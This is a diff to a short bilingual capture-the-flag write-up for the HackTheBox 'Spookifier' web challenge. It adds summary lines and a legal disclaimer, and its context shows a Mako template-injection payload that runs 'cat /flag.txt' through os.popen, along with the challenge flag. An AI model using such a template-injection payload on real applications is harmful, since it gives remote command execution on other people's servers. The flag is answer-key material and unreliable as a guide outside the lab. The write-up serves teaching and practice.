@@ -1,5 +1,7 @@
 # Spookifier
 
+> **ES:** Web · VERY EASY — SSTI Mako hacia RCE (cat /flag.txt).
+> **EN:** Web · VERY EASY — Mako SSTI to RCE (cat /flag.txt).
 :::note CHALLENGE DESCRIPTION
 
 Difficulty: VERY EASY
@@ -29,3 +31,12 @@ ${self.module.cache.util.os.popen('cat /flag.txt').read()}
 ```flag
 HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}
 ```
+
+---
+
+## Aviso Legal / Disclaimer
+
+> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de contenido activo.
+> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish active content flags.
+
+_Fecha de edición: 2026-09-24_
